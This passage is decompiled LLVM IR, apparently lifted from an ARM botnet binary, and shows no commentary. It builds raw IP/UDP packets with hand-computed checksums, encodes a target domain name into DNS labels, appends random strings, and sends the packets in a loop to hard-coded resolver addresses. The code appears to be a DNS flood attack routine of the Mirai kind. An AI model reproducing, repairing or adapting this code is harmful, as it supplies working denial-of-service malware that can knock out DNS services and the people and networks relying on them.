dec_label_pc_bb24:                                ; preds = %dec_label_pc_bfa4, %dec_label_pc_bf90, %dec_label_pc_bf80, %dec_label_pc_bf44, %dec_label_pc_bb14
  %stack_var_-2184.0 = phi i32 [ 33686020, %dec_label_pc_bb14 ], [ 104859200, %dec_label_pc_bf80 ], [ 707416650, %dec_label_pc_bfa4 ], [ 134744072, %dec_label_pc_bf90 ], [ %v1_bf74, %dec_label_pc_bf44 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bb28 = call i32 @__GI_time(i32* null)
  %v0_bb2c = load i32, i32* @r7, align 4
  %v2_bb2c = icmp eq i32 %v0_bb2c, 0
  store i1 %v2_bb2c, i1* %cpsr_z.global-to-local, align 1
  %v1_bb30 = load i32, i32* @fp, align 4
  %v2_bb30 = add i32 %v1_bb30, %v2_bb28
  store i32 %v2_bb30, i32* %r0.global-to-local, align 4
  br i1 %v2_bb2c, label %dec_label_pc_bf1c, label %dec_label_pc_bb3c

dec_label_pc_bb3c:                                ; preds = %dec_label_pc_bb24
  store i32 %v0_bb2c, i32* %r0.global-to-local, align 4
  %v1_bb40 = inttoptr i32 %v0_bb2c to i8*
  %v2_bb40 = call i32 @util_strlen(i8* %v1_bb40)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_bb54 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_bb54, i32* %r0.global-to-local, align 4
  %v7_bb58 = icmp eq i32 %v3_bb54, -1
  store i1 %v7_bb58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bb58, label %dec_label_pc_bf1c, label %dec_label_pc_bb64

dec_label_pc_bb64:                                ; preds = %dec_label_pc_bb3c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bb6c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bb6c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bb80 = call i32 @__GI_setsockopt(i32 %v3_bb54, i32 0, i32 3, i32 %v6_bb6c, i32 4)
  store i32 %v5_bb80, i32* %r0.global-to-local, align 4
  %v7_bb84 = icmp eq i32 %v5_bb80, -1
  store i1 %v7_bb84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bb84, label %dec_label_pc_bf14, label %dec_label_pc_bb8c

dec_label_pc_bb8c:                                ; preds = %dec_label_pc_bb64
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v3_bba8 = mul i32 %v6_b9b4, 65536
  store i32 %v3_bba8, i32* %sb.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_bbb8 = urem i32 %v7_b940, 65536
  %v3_bbbc = urem i32 %v6_b99c, 65536
  store i32 %v3_bbbc, i32* %r0.global-to-local, align 4
  %v3_bbc0 = urem i32 %v6_b9b4, 65536
  store i32 %v3_bbc0, i32* %r1.global-to-local, align 4
  %v3_bbc4 = urem i32 %v6_b9d0, 65536
  store i32 %v3_bbc4, i32* %r2.global-to-local, align 4
  %v2_bbc8 = icmp eq i32 %arg2, 0
  store i1 %v2_bbc8, i1* %cpsr_z.global-to-local, align 1
  %v1_bbcc = urem i32 %v6_b9e8, 256
  store i32 %v1_bbcc, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bbc8, label %dec_label_pc_bf2c.critedge, label %dec_label_pc_bbe8

dec_label_pc_bbe8:                                ; preds = %dec_label_pc_bb8c
  %v3_bb9c = mul i32 %v6_b9d0, 65536
  %v2_bbf4 = add i32 %v2_bb40, %v1_bbcc
  %v3_bbf8 = mul i32 %v2_bbf4, 65536
  %v1_bc04 = add i32 %v3_bbf8, 1769472
  %tmp114 = mul nuw nsw i32 %v3_bbc0, 256
  %v3_bc08 = and i32 %tmp114, 65280
  %v1_bc0c = add i32 %v3_bbf8, 3080192
  %tmp115 = udiv i32 %v6_b9b4, 256
  %v4_bc1c = urem i32 %tmp115, 256
  %v5_bc1c = or i32 %v3_bc08, %v4_bc1c
  store i32 %v5_bc1c, i32* @sb, align 4
  store i32 %v3_bb9c, i32* %ip.global-to-local, align 4
  %tmp116 = udiv i32 %v1_bc04, 256
  %v3_bc24 = and i32 %tmp116, 65280
  %tmp117 = udiv i32 %v1_bc0c, 256
  %v3_bc28 = and i32 %tmp117, 65280
  store i32 %v3_bc28, i32* %r2.global-to-local, align 4
  %tmp118 = mul i32 %v6_b9d0, 256
  %v3_bc2c = and i32 %tmp118, 65280
  %v4_bc30 = udiv i32 %v1_bc04, 16777216
  %v5_bc30 = or i32 %v3_bc24, %v4_bc30
  store i32 %v5_bc30, i32* @fp, align 4
  %tmp119 = mul i32 %v7_b940, 256
  %v3_bc38 = and i32 %tmp119, 65280
  store i32 %v3_bc38, i32* %r1.global-to-local, align 4
  %v4_bc3c = udiv i32 %v1_bc0c, 16777216
  %v5_bc3c = or i32 %v3_bc28, %v4_bc3c
  store i32 %v5_bc3c, i32* %r3.global-to-local, align 4
  %tmp120 = udiv i32 %v6_b9d0, 256
  %v4_bc40 = urem i32 %tmp120, 256
  %v5_bc40 = or i32 %v4_bc40, %v3_bc2c
  store i32 %v5_bc40, i32* @r4, align 4
  store i32 %v2_bb40, i32* @lr, align 4
  %tmp121 = udiv i32 %v7_b940, 256
  %v4_bc48 = urem i32 %tmp121, 256
  %v5_bc48 = or i32 %v4_bc48, %v3_bc38
  %tmp122 = mul i32 %v6_b99c, 256
  %v3_bc4c = and i32 %tmp122, 65280
  store i32 %v3_bc4c, i32* %r0.global-to-local, align 4
  %tmp123 = udiv i32 %v6_b99c, 256
  %v4_bc5c = urem i32 %tmp123, 256
  %v5_bc5c = or i32 %v4_bc5c, %v3_bc4c
  store i32 %v5_bc5c, i32* @r8, align 4
  store i32 0, i32* @r5, align 4
  %v1_bc64 = add i32 %v2_bb40, 1
  store i32 %v1_bc64, i32* @r6, align 4
  %v1_bcac = trunc i32 %v6_b91c to i8
  %sext = mul nuw i32 %v5_bc3c, 65536
  %v4_bcb8 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_bc48, 65536
  %v4_bcbc = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_bc40, 65536
  %v4_bd18 = sdiv i32 %sext7, 65536
  %v2_bd3c = icmp eq i32 %v2_bb40, 0
  %tmp124 = icmp slt i32 %v2_bb40, 1
  %v1_bcc4 = trunc i32 %v5_b978 to i8
  br label %dec_label_pc_bc68

dec_label_pc_bc68:                                ; preds = %dec_label_pc_bd88, %dec_label_pc_bbe8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_bc70 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_bc70, i32* %r0.global-to-local, align 4
  store i32 %v2_b904, i32* %r1.global-to-local, align 4
  %v3_bc78 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc78, i32* %r3.global-to-local, align 4
  %v2_bc7c = load i32, i32* @r5, align 4
  %v5_bc7c = mul i32 %v2_bc7c, 4
  %v6_bc7c = add i32 %v5_bc7c, %v2_b904
  %v7_bc7c = inttoptr i32 %v6_bc7c to i32*
  store i32 %v2_bc70, i32* %v7_bc7c, align 4
  %v0_bc80 = load i32, i32* %r1.global-to-local, align 4
  %v1_bc80 = load i32, i32* %r3.global-to-local, align 4
  %v4_bc80 = mul i32 %v1_bc80, 4
  %v5_bc80 = add i32 %v4_bc80, %v0_bc80
  %v6_bc80 = inttoptr i32 %v5_bc80 to i32*
  %v7_bc80 = load i32, i32* %v6_bc80, align 4
  store i32 %v7_bc80, i32* %r1.global-to-local, align 4
  %v1_bc84 = inttoptr i32 %v7_bc80 to i8*
  %v2_bc84 = load i8, i8* %v1_bc84, align 1
  %tmp = urem i8 %v2_bc84, 16
  %v1_bc88 = zext i8 %tmp to i32
  %v1_bc8c = or i32 %v1_bc88, 64
  store i32 %v1_bc8c, i32* %r2.global-to-local, align 4
  %v1_bc90 = trunc i32 %v1_bc8c to i8
  store i8 %v1_bc90, i8* %v1_bc84, align 1
  %v0_bc94 = load i32, i32* %r1.global-to-local, align 4
  %v1_bc94 = inttoptr i32 %v0_bc94 to i8*
  %v2_bc94 = load i8, i8* %v1_bc94, align 1
  %v1_bc98 = and i8 %v2_bc94, -16
  %v1_bc9c = or i8 %v1_bc98, 5
  store i32 %v1_b984, i32* %ip.global-to-local, align 4
  store i8 %v1_bc9c, i8* %v1_bc94, align 1
  store i32 %v1_b928, i32* %lr.global-to-local, align 4
  %v2_bcac = load i32, i32* %r1.global-to-local, align 4
  %v3_bcac = add i32 %v2_bcac, 1
  %v4_bcac = inttoptr i32 %v3_bcac to i8*
  store i8 %v1_bcac, i8* %v4_bcac, align 1
  store i32 %v5_b978, i32* %r3.global-to-local, align 4
  %v0_bcb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bcb4 = icmp eq i32 %v0_bcb4, 0
  store i1 %v2_bcb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_bcb8, i32* %r0.global-to-local, align 4
  store i32 %v4_bcbc, i32* %r2.global-to-local, align 4
  br i1 %v2_bcb4, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_bc68
  store i32 64, i32* %lr.global-to-local, align 4
  br label %bb126

bb126:                                            ; preds = %dec_label_pc_bc68, %bb125
  %v2_bcc4 = load i32, i32* %r1.global-to-local, align 4
  %v3_bcc4 = add i32 %v2_bcc4, 8
  %v4_bcc4 = inttoptr i32 %v3_bcc4 to i8*
  store i8 %v1_bcc4, i8* %v4_bcc4, align 1
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_bccc = load i32, i32* %r1.global-to-local, align 4
  %v3_bccc = add i32 %v2_bccc, 9
  %v4_bccc = inttoptr i32 %v3_bccc to i8*
  store i8 17, i8* %v4_bccc, align 1
  %v0_bcd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bcd0, label %bb128, label %bb127

bb127:                                            ; preds = %bb126
  %v1_bcd0 = load i32, i32* %lr.global-to-local, align 4
  %v2_bcd0 = trunc i32 %v1_bcd0 to i16
  %v3_bcd0 = load i32, i32* %r1.global-to-local, align 4
  %v4_bcd0 = add i32 %v3_bcd0, 6
  %v5_bcd0 = inttoptr i32 %v4_bcd0 to i16*
  store i16 %v2_bcd0, i16* %v5_bcd0, align 2
  br label %bb128

bb128:                                            ; preds = %bb126, %bb127
  store i32 ptrtoint (i32* @global_var_23a4c.55 to i32), i32* @lr, align 4
  %v0_bcd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_bcd8 = trunc i32 %v0_bcd8 to i16
  %v2_bcd8 = load i32, i32* %r1.global-to-local, align 4
  %v3_bcd8 = add i32 %v2_bcd8, 2
  %v4_bcd8 = inttoptr i32 %v3_bcd8 to i16*
  store i16 %v1_bcd8, i16* %v4_bcd8, align 2
  %v0_bcdc = load i32, i32* %r2.global-to-local, align 4
  %v1_bcdc = trunc i32 %v0_bcdc to i16
  %v2_bcdc = load i32, i32* %r1.global-to-local, align 4
  %v3_bcdc = add i32 %v2_bcdc, 4
  %v4_bcdc = inttoptr i32 %v3_bcdc to i16*
  store i16 %v1_bcdc, i16* %v4_bcdc, align 2
  %v2_bce0 = load i32, i32* @global_var_23a4c.55, align 4
  store i32 %v2_bce0, i32* %r3.global-to-local, align 4
  %v0_bce4 = load i32, i32* %r1.global-to-local, align 4
  %v1_bce4 = add i32 %v0_bce4, 20
  store i32 %v1_bce4, i32* %r0.global-to-local, align 4
  %v1_bce8 = add i32 %v0_bce4, 41
  store i32 %v1_bce8, i32* %r2.global-to-local, align 4
  %v0_bcec = load i32, i32* @fp, align 4
  %v1_bcec = trunc i32 %v0_bcec to i16
  %v3_bcec = add i32 %v0_bce4, 24
  %v4_bcec = inttoptr i32 %v3_bcec to i16*
  store i16 %v1_bcec, i16* %v4_bcec, align 2
  %v0_bcf0 = load i32, i32* @sb, align 4
  %v1_bcf0 = trunc i32 %v0_bcf0 to i16
  %v2_bcf0 = load i32, i32* %r0.global-to-local, align 4
  %v3_bcf0 = add i32 %v2_bcf0, 2
  %v4_bcf0 = inttoptr i32 %v3_bcf0 to i16*
  store i16 %v1_bcf0, i16* %v4_bcf0, align 2
  %v0_bcf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_bcf4 = add i32 %v0_bcf4, 28
  store i32 %v1_bcf4, i32* %ip.global-to-local, align 4
  %v0_bcf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_bcf8 = load i32, i32* @sl, align 4
  %v2_bcf8 = add i32 %v1_bcf8, %v0_bcf8
  store i32 %v2_bcf8, i32* @r4, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_bd04 = load i32, i32* @r8, align 4
  %v1_bd04 = trunc i32 %v0_bd04 to i16
  %v3_bd04 = add i32 %v0_bcf4, 20
  %v4_bd04 = inttoptr i32 %v3_bd04 to i16*
  store i16 %v1_bd04, i16* %v4_bd04, align 2
  %v0_bd08 = load i32, i32* %r3.global-to-local, align 4
  %v1_bd08 = load i32, i32* %r1.global-to-local, align 4
  %v2_bd08 = add i32 %v1_bd08, 12
  %v3_bd08 = inttoptr i32 %v2_bd08 to i32*
  store i32 %v0_bd08, i32* %v3_bd08, align 4
  %v0_bd0c = load i32, i32* %r0.global-to-local, align 4
  %v1_bd0c = trunc i32 %v0_bd0c to i16
  %v2_bd0c = load i32, i32* %ip.global-to-local, align 4
  %v3_bd0c = add i32 %v2_bd0c, 4
  %v4_bd0c = inttoptr i32 %v3_bd0c to i16*
  store i16 %v1_bd0c, i16* %v4_bd0c, align 2
  %v0_bd10 = load i32, i32* %r2.global-to-local, align 4
  %v1_bd10 = trunc i32 %v0_bd10 to i16
  %v2_bd10 = load i32, i32* %ip.global-to-local, align 4
  %v3_bd10 = add i32 %v2_bd10, 2
  %v4_bd10 = inttoptr i32 %v3_bd10 to i16*
  store i16 %v1_bd10, i16* %v4_bd10, align 2
  store i32 %stack_var_-2184.0, i32* %r3.global-to-local, align 4
  store i32 %v4_bd18, i32* %ip.global-to-local, align 4
  %v1_bd1c = load i32, i32* %r1.global-to-local, align 4
  %v2_bd1c = add i32 %v1_bd1c, 16
  %v3_bd1c = inttoptr i32 %v2_bd1c to i32*
  store i32 %stack_var_-2184.0, i32* %v3_bd1c, align 4
  %v0_bd20 = load i32, i32* %ip.global-to-local, align 4
  %v1_bd20 = trunc i32 %v0_bd20 to i16
  %v2_bd20 = load i32, i32* %r1.global-to-local, align 4
  %v3_bd20 = add i32 %v2_bd20, 28
  %v4_bd20 = inttoptr i32 %v3_bd20 to i16*
  store i16 %v1_bd20, i16* %v4_bd20, align 2
  %v0_bd24 = load i32, i32* @sl, align 4
  %v1_bd24 = trunc i32 %v0_bd24 to i8
  %v2_bd24 = load i32, i32* %r1.global-to-local, align 4
  %v3_bd24 = add i32 %v2_bd24, 40
  %v4_bd24 = inttoptr i32 %v3_bd24 to i8*
  store i8 %v1_bd24, i8* %v4_bd24, align 1
  %v0_bd28 = load i32, i32* @r4, align 4
  %v1_bd28 = add i32 %v0_bd28, 1
  store i32 %v1_bd28, i32* %r0.global-to-local, align 4
  %v0_bd2c = load i32, i32* @r7, align 4
  store i32 %v0_bd2c, i32* %r1.global-to-local, align 4
  %v0_bd30 = load i32, i32* @r6, align 4
  store i32 %v0_bd30, i32* %r2.global-to-local, align 4
  %v3_bd34 = call i32 @util_memcpy(i32 %v1_bd28, i32 %v0_bd2c, i32 %v0_bd30)
  store i32 %v3_bd34, i32* %r0.global-to-local, align 4
  store i32 %v2_bb40, i32* %lr.global-to-local, align 4
  store i1 %v2_bd3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp124, label %.dec_label_pc_bd88_crit_edge, label %dec_label_pc_bd4c

.dec_label_pc_bd88_crit_edge:                     ; preds = %bb128
  %v5_bd40 = load i32, i32* @r4, align 4
  store i32 %v5_bd40, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bd88

dec_label_pc_bd4c:                                ; preds = %bb128
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_bd50 = load i32, i32* @r4, align 4
  store i32 %v0_bd50, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bd58

dec_label_pc_bd58:                                ; preds = %.thread19, %dec_label_pc_bd4c
  %v1_bd60 = phi i32 [ %v1_bd6035, %.thread19 ], [ 0, %dec_label_pc_bd4c ]
  %v0_bd7417 = phi i32 [ %v0_bd80, %.thread19 ], [ 0, %dec_label_pc_bd4c ]
  %v1_bd58 = load i32, i32* @r7, align 4
  %v2_bd58 = add i32 %v1_bd58, %v0_bd7417
  %v3_bd58 = inttoptr i32 %v2_bd58 to i8*
  %v4_bd58 = load i8, i8* %v3_bd58, align 1
  %v6_bd58 = zext i8 %v4_bd58 to i32
  store i32 %v6_bd58, i32* %r3.global-to-local, align 4
  %v7_bd5c = icmp eq i8 %v4_bd58, 46
  store i1 %v7_bd5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bd5c, label %bb129, label %bb131

bb129:                                            ; preds = %dec_label_pc_bd58
  %v2_bd60 = trunc i32 %v1_bd60 to i8
  %v3_bd60 = load i32, i32* %r0.global-to-local, align 4
  %v4_bd60 = inttoptr i32 %v3_bd60 to i8*
  store i8 %v2_bd60, i8* %v4_bd60, align 1
  %v0_bd68.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_bd64 = load i32, i32* %ip.global-to-local, align 4
  %v1_bd64 = add i32 %v0_bd64, 1
  store i32 %v1_bd64, i32* %r2.global-to-local, align 4
  br i1 %v0_bd68.pr, label %bb132, label %bb130

bb130:                                            ; preds = %bb129
  %v2_bd6815 = urem i32 %v1_bd64, 256
  store i32 %v2_bd6815, i32* %ip.global-to-local, align 4
  store i32 %v2_bb40, i32* %r2.global-to-local, align 4
  %v0_bd74.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_bd74 = add i32 %v0_bd74.pre, 1
  store i32 %v1_bd74, i32* %r1.global-to-local, align 4
  br label %.thread19

bb131:                                            ; preds = %dec_label_pc_bd58
  %v1_bd6411 = add nsw i32 %v1_bd60, 1
  %v2_bd68 = urem i32 %v1_bd6411, 256
  store i32 %v2_bd68, i32* %ip.global-to-local, align 4
  store i32 %v2_bb40, i32* %r2.global-to-local, align 4
  %v1_bd7418 = add i32 %v0_bd7417, 1
  store i32 %v1_bd7418, i32* %r1.global-to-local, align 4
  br label %.thread19

bb132:                                            ; preds = %bb129
  store i32 %v2_bb40, i32* %r2.global-to-local, align 4
  %v1_bd70.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_bd70 = load i32, i32* @r4, align 4
  %v3_bd70 = add i32 %v2_bd70, %v1_bd70.pre
  store i32 %v3_bd70, i32* %r3.global-to-local, align 4
  %v1_bd7465 = add i32 %v1_bd70.pre, 1
  store i32 %v1_bd7465, i32* %r1.global-to-local, align 4
  %v2_bd78 = add i32 %v3_bd70, 1
  store i32 %v2_bd78, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread19

.thread19:                                        ; preds = %bb131, %bb130, %bb132
  %v0_bd80 = phi i32 [ %v1_bd74, %bb130 ], [ %v1_bd7418, %bb131 ], [ %v1_bd7465, %bb132 ]
  %v1_bd6035 = phi i32 [ %v2_bd6815, %bb130 ], [ %v2_bd68, %bb131 ], [ 0, %bb132 ]
  %v9_bd80 = icmp eq i32 %v0_bd80, %v2_bb40
  store i1 %v9_bd80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bd80, label %dec_label_pc_bd88.loopexit, label %dec_label_pc_bd58

dec_label_pc_bd88.loopexit:                       ; preds = %.thread19
  %v2_bd88.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t71 = trunc i32 %v1_bd6035 to i8
  br label %dec_label_pc_bd88

dec_label_pc_bd88:                                ; preds = %.dec_label_pc_bd88_crit_edge, %dec_label_pc_bd88.loopexit
  %v0_bd88.pre.sink.off0 = phi i8 [ 0, %.dec_label_pc_bd88_crit_edge ], [ %extract.t71, %dec_label_pc_bd88.loopexit ]
  %v2_bd88 = phi i32 [ %v5_bd40, %.dec_label_pc_bd88_crit_edge ], [ %v2_bd88.pre, %dec_label_pc_bd88.loopexit ]
  %v3_bd88 = inttoptr i32 %v2_bd88 to i8*
  store i8 %v0_bd88.pre.sink.off0, i8* %v3_bd88, align 1
  %v3_bd8c = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_bd94 = add i32 %v3_bd8c, 1
  store i32 %v1_bd94, i32* @r5, align 4
  store i32 %v2_bb40, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_bda0 = load i32, i32* @r4, align 4
  %v2_bda0 = add i32 %v0_bda0, %v2_bb40
  store i32 %v2_bda0, i32* %r2.global-to-local, align 4
  %v9_bda4 = icmp eq i32 %v1_bd94, %arg2
  store i1 %v9_bda4, i1* %cpsr_z.global-to-local, align 1
  %v3_bda8 = add i32 %v2_bda0, 4
  %v4_bda8 = inttoptr i32 %v3_bda8 to i16*
  store i16 256, i16* %v4_bda8, align 2
  %v0_bdac = load i32, i32* @lr, align 4
  %v1_bdac = trunc i32 %v0_bdac to i16
  %v2_bdac = load i32, i32* %r2.global-to-local, align 4
  %v3_bdac = add i32 %v2_bdac, 2
  %v4_bdac = inttoptr i32 %v3_bdac to i16*
  store i16 %v1_bdac, i16* %v4_bdac, align 2
  %v0_bdb0 = load i32, i32* @r5, align 4
  store i32 %v0_bdb0, i32* %stack_var_-44, align 4
  %v8_bdb4 = icmp slt i32 %v1_bd94, %arg2
  br i1 %v8_bdb4, label %dec_label_pc_bc68, label %dec_label_pc_bdb8

dec_label_pc_bdb8:                                ; preds = %dec_label_pc_bd88, %dec_label_pc_bf2c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 %v2_bbc8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bbc8, label %dec_label_pc_bf2c, label %dec_label_pc_bdcc

dec_label_pc_bdcc:                                ; preds = %dec_label_pc_bdb8
  store i32 %v2_bb40, i32* %r1.global-to-local, align 4
  %v1_bdd0 = load i32, i32* @sl, align 4
  %v2_bdd0 = add i32 %v1_bdd0, %v2_bb40
  store i32 %v2_bdd0, i32* %r3.global-to-local, align 4
  %v1_bdd4 = add i32 %v2_bdd0, 47
  store i32 %v1_bdd4, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_bddc = add i32 %v2_bdd0, 27
  store i32 %v1_bddc, i32* @sb, align 4
  %v3_beb8 = icmp eq i32 %v3_bbb8, 65535
  %v3_bde8 = icmp eq i32 %v3_bbbc, 65535
  br label %dec_label_pc_bea4

dec_label_pc_bde4:                                ; preds = %dec_label_pc_bea4
  store i32 %v3_bbbc, i32* %ip.global-to-local, align 4
  store i1 %v3_bde8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bde8, label %dec_label_pc_bee0, label %dec_label_pc_bdf0

dec_label_pc_bdf0:                                ; preds = %dec_label_pc_becc.dec_label_pc_bdf0_crit_edge, %dec_label_pc_bde4
  %v1_bdf4 = phi i32 [ %v1_bdf4.pre, %dec_label_pc_becc.dec_label_pc_bdf0_crit_edge ], [ 65535, %dec_label_pc_bde4 ]
  store i32 %v3_bbc0, i32* @lr, align 4
  %v9_bdf4 = icmp eq i32 %v3_bbc0, %v1_bdf4
  store i1 %v9_bdf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bdf4, label %dec_label_pc_bef4, label %dec_label_pc_bdfc

dec_label_pc_bdfc:                                ; preds = %dec_label_pc_bee0.dec_label_pc_bdfc_crit_edge, %dec_label_pc_bdf0
  %v1_be00 = phi i32 [ %v1_be00.pre, %dec_label_pc_bee0.dec_label_pc_bdfc_crit_edge ], [ %v1_bdf4, %dec_label_pc_bdf0 ]
  store i32 %v3_bbc4, i32* %r0.global-to-local, align 4
  %v9_be00 = icmp eq i32 %v3_bbc4, %v1_be00
  store i1 %v9_be00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_be00, label %dec_label_pc_bf08, label %dec_label_pc_be08

dec_label_pc_be08:                                ; preds = %dec_label_pc_bef4, %dec_label_pc_bdfc, %dec_label_pc_bf08
  %v0_be08 = load i32, i32* @r7, align 4
  store i32 %v0_be08, i32* %r0.global-to-local, align 4
  %v0_be0c = load i32, i32* @sl, align 4
  store i32 %v0_be0c, i32* %r1.global-to-local, align 4
  %v2_be10 = call i32 @rand_alphastr(i32 %v0_be08, i32 %v0_be0c)
  %v0_be14 = load i32, i32* @r8, align 4
  %v1_be14 = trunc i32 %v0_be14 to i8
  %v2_be14 = load i32, i32* @r7, align 4
  %v3_be14 = load i32, i32* @sl, align 4
  %v4_be14 = add i32 %v3_be14, %v2_be14
  %v5_be14 = inttoptr i32 %v4_be14 to i8*
  store i8 %v1_be14, i8* %v5_be14, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_be1c = load i32, i32* @r8, align 4
  %v1_be1c = trunc i32 %v0_be1c to i16
  %v2_be1c = load i32, i32* @r4, align 4
  %v3_be1c = add i32 %v2_be1c, 10
  %v4_be1c = inttoptr i32 %v3_be1c to i16*
  store i16 %v1_be1c, i16* %v4_be1c, align 2
  %v0_be20 = load i32, i32* @r4, align 4
  store i32 %v0_be20, i32* @r0, align 4
  %v2_be24 = call i32 @checksum_generic(i32 %v0_be20, i32 20)
  %v3_be24 = trunc i32 %v2_be24 to i16
  store i32 %v2_be24, i32* %r0.global-to-local, align 4
  %v3_be28 = load i32, i32* @r4, align 4
  %v4_be28 = add i32 %v3_be28, 10
  %v5_be28 = inttoptr i32 %v4_be28 to i16*
  store i16 %v3_be24, i16* %v5_be28, align 2
  %v0_be2c = load i32, i32* @r6, align 4
  store i32 %v0_be2c, i32* @r1, align 4
  %v1_be30 = add i32 %v0_be2c, 4
  %v2_be30 = inttoptr i32 %v1_be30 to i16*
  %v3_be30 = load i16, i16* %v2_be30, align 2
  %v4_be30 = zext i16 %v3_be30 to i32
  store i32 %v4_be30, i32* %r2.global-to-local, align 4
  %v0_be34 = load i32, i32* @r8, align 4
  %v1_be34 = trunc i32 %v0_be34 to i16
  %v3_be34 = add i32 %v0_be2c, 6
  %v4_be34 = inttoptr i32 %v3_be34 to i16*
  store i16 %v1_be34, i16* %v4_be34, align 2
  %v0_be38 = load i32, i32* @sb, align 4
  store i32 %v0_be38, i32* %r3.global-to-local, align 4
  %v0_be3c = load i32, i32* @r4, align 4
  store i32 %v0_be3c, i32* %r0.global-to-local, align 4
  %v4_be40 = call i32 @checksum_tcpudp(i32 %v0_be3c, i32 %v0_be2c, i32 %v4_be30, i32 %v0_be38)
  %v5_be40 = trunc i32 %v4_be40 to i16
  store i32 %v4_be40, i32* %r0.global-to-local, align 4
  %v3_be44 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_be44, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_be4c = mul i32 %v3_be44, 32
  store i32 %v3_be4c, i32* %ip.global-to-local, align 4
  %v3_be50 = load i32, i32* @r6, align 4
  %v4_be50 = add i32 %v3_be50, 6
  %v5_be50 = inttoptr i32 %v4_be50 to i16*
  store i16 %v5_be40, i16* %v5_be50, align 2
  store i32 %stack_var_-2184.0, i32* %r2.global-to-local, align 4
  %v0_be58 = load i32, i32* @r6, align 4
  %v1_be58 = add i32 %v0_be58, 2
  %v2_be58 = inttoptr i32 %v1_be58 to i16*
  %v3_be58 = load i16, i16* %v2_be58, align 2
  %v4_be58 = zext i16 %v3_be58 to i32
  store i32 %v4_be58, i32* @r6, align 4
  %v0_be5c = load i32, i32* %ip.global-to-local, align 4
  %v1_be5c = load i32, i32* %r3.global-to-local, align 4
  %tmp135 = mul i32 %v1_be5c, -8
  %v5_be5c = add i32 %v0_be5c, %tmp135
  %v1_be60 = load i32, i32* %r1.global-to-local, align 4
  %v2_be60 = add i32 %v1_be60, %v5_be5c
  store i32 %v2_be60, i32* %ip.global-to-local, align 4
  %v2_be64 = add i32 %v2_be60, 4
  %v3_be64 = inttoptr i32 %v2_be64 to i32*
  store i32 %stack_var_-2184.0, i32* %v3_be64, align 4
  %v0_be68 = load i32, i32* @r6, align 4
  %v1_be68 = trunc i32 %v0_be68 to i16
  %v2_be68 = load i32, i32* %ip.global-to-local, align 4
  %v3_be68 = add i32 %v2_be68, 2
  %v4_be68 = inttoptr i32 %v3_be68 to i16*
  store i16 %v1_be68, i16* %v4_be68, align 2
  %v0_be6c = load i32, i32* @r4, align 4
  store i32 %v0_be6c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_bb54, i32* %r0.global-to-local, align 4
  %v0_be78 = load i32, i32* @fp, align 4
  store i32 %v0_be78, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_be80 = load i32, i32* %ip.global-to-local, align 4
  %v6_be88 = call i32 @__libc_sendto(i32 %v3_bb54, i32 %v0_be6c, i32 %v0_be78, i32 16384, i32 %v0_be80, i32 16)
  %v3_be8c = load i32, i32* %stack_var_-44, align 4
  %v1_be90 = add i32 %v3_be8c, 1
  store i32 %v1_be90, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_be98 = icmp eq i32 %v1_be90, %arg2
